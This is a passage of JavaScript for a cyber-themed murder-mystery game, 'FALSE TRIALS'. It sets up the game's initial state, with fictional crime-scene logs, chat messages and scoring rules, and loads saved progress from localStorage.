4. DEFINITIVE PROOF: Her biometric fingerprints and DNA were isolated on the murder weapon (BIO-602), and her executive gateway authentication at 08:31:45 (LOG-601) places her at the scene at the moment of fatal ingestion.`,
    tags: ['Case Closed', 'Elena Ward Guilty', 'Full Proof', 'High Tribunal']
  }
];

export function createInitialGameState() {
  return {
    phase: 'LOBBY',
    currentStage: 1, // Progresses from 1 to 5 as challenges are solved
    completedStages: [], // [1, 2, 3, etc.]
    unlockedEvidenceBatches: [1], // Batch 1 unlocked initially (Stage 0)
    round: 1,
    maxRounds: 5,
    timer: 240,
    hintsRemaining: 3,
    hintsUsedPerChallenge: {},
    teams: INITIAL_SUSPECTS,
    challenges: PYTHON_CHALLENGES,
    systemLogs: [
      { id: 'LOG-1', timestamp: '08:35:10', type: 'BREACH', source: 'CRIME_SCENE', message: 'CRITICAL: Dr. Adrian Vale found unresponsive in Private Lab 101. Building lockdown active.' },
      { id: 'LOG-2', timestamp: '08:36:04', type: 'ANOMALY', source: 'TOXICOLOGY', message: 'Emergency medical screen detected organophosphate neurotoxin in desk beverage.' },
      { id: 'LOG-3', timestamp: '08:38:22', type: 'BREACH', source: 'ACCESS_GW', message: 'Corridor CCTV camera desync logged between 08:26 and 08:38.' },
      { id: 'LOG-4', timestamp: '08:40:01', type: 'FORENSIC_SOLVE', source: 'TERMINAL', message: 'FALSE TRIALS Tribunal Terminal initialized. Investigator credentials granted.' }
    ],
    chatMessages: [
      {
        id: 'MSG-INIT',
        timestamp: '08:36',
        senderTeamId: 'DISPATCH',
        senderTeamName: 'init Association Command',
        channel: 'PUBLIC',
        text: 'Welcome to FALSE TRIALS. Multiple suspects have conflicting evidence against them. Complete Python forensic stages to unlock progressive evidence batches.'
      }
    ],
    scoringRules: {
      SOLVE_PYTHON_CHALLENGE: 100,
      CORRECT_HACKER_ACCUSATION: 500,
      FALSE_ACCUSATION_PENALTY: -50
    },
    securityAlerts: []
  };
}

export function loadSavedGameState() {
  if (typeof window === 'undefined') return null;
  try {
    const raw = localStorage.getItem('cyber_mafia_game_state');
    if (!raw) return null;
    const parsed = JSON.parse(raw);
    return {
      ...createInitialGameState(),
      ...parsed,
      challenges: PYTHON_CHALLENGES
    };
  } catch (e) {
    console.warn('Could not parse saved game state:', e);
    return null;
  }
}
